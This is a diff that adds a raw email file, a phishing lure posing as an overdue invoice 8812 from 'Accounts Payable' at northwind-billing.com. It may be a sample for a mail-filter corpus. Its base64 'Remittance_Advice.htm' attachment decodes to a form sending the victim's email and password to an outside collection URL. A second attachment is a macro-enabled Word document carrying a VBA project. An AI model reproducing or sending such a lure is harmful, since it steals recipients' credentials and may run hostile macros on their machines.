@@ -1,0 +1,56 @@
+Delivered-To: you@example.org
+Received:
+ by 2002:a05:6a10:1234 with SMTP id x1csp1;  Mon, 12 Oct 2026 02:30:00 -0700
+Authentication-Results: mx.google.com; dkim=none; spf=softfail (google.com:
+ domain of bounce@northwind-billing.com)
+ smtp.mailfrom=bounce@northwind-billing.com; dmarc=none (p=NONE sp=NONE
+ dis=NONE) header.from=northwind-billing.com
+From: "Accounts Payable" <ap@northwind-billing.com>
+To: you@example.org
+Subject: Invoice 8812 - payment overdue
+Date: Mon, 12 Oct 2026 09:30:00 +0000
+Message-ID: <ebc13ce461a9211b@mail.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============5715591975222970813=="
+
+--===============5715591975222970813==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+The attached invoice is overdue. Please review the remittance advice and pay =
+today.
+AP
+
+--===============5715591975222970813==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Remittance_Advice.htm"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwczovL25vcnRod2luZC1iaWxsaW5nLndlYi5h
+cHAvY29sbGVjdCI+PGlucHV0IG5hbWU9ImVtYWlsIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5h
+bWU9InB3Ij48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=
+
+--===============5715591975222970813==
+Content-Type: application/vnd.ms-word.document.macroEnabled.12
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_8812.docm"
+MIME-Version: 1.0
+
+UEsDBBQAAAAIANG8Tl3uR1hmHwAAAB0AAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbLOxr8jNUShL
+LSrOzM+zVTLUM1Cyt7MJqSxILda3AwBQSwMEFAAAAAgA0bxOXd1ahg0PAAAADQAAABEAAAB3b3Jk
+L2RvY3VtZW50LnhtbLMpt0rJTy7NTc0r0bcDAFBLAwQUAAAACADRvE5d4vCBZyYAAAAkAAAAEwAA
+AHdvcmQvdmJhUHJvamVjdC5iaW67cF7wgUJmXmpRiUJBTmJyakZ+TkpqkY5CXn6JQlFqYo5CmJMj
+AFBLAwQUAAAACADRvE5doM6h56sAAAD3AAAAHAAAAHdvcmQvX3JlbHMvc2V0dGluZ3MueG1sLnJl
+bHNVj70OwjAMhF+lyk7cMjCg/iwwdGBBfYHQuG2kJI4SA+XtiQRIdLw73edz3a3OFg+MyZBvRCVL
+0bX1Fa3ibKTFhLSVRa8bEXtdiWJ4BWzEwhyOAGlc0KkkKaDPyImiU5xlnIGmyYx4ovHu0DPsy/IA
+8f8CKGaV+3pAF7KPma3ijPyhp4znb5Kkp8jL03i9uxlrjZ/lSA5YamL3611I52XnlTF6ZQW0NWxf
+egNQSwECFAMUAAAACADRvE5d7kdYZh8AAAAdAAAAEwAAAAAAAAAAAAAAgAEAAAAAW0NvbnRlbnRf
+VHlwZXNdLnhtbFBLAQIUAxQAAAAIANG8Tl3dWoYNDwAAAA0AAAARAAAAAAAAAAAAAACAAVAAAAB3
+b3JkL2RvY3VtZW50LnhtbFBLAQIUAxQAAAAIANG8Tl3i8IFnJgAAACQAAAATAAAAAAAAAAAAAACA
+AY4AAAB3b3JkL3ZiYVByb2plY3QuYmluUEsBAhQDFAAAAAgA0bxOXaDOoeerAAAA9wAAABwAAAAA
+AAAAAAAAAIAB5QAAAHdvcmQvX3JlbHMvc2V0dGluZ3MueG1sLnJlbHNQSwUGAAAAAAQABAALAQAA
+ygEAAAAA
+
+--===============5715591975222970813==--
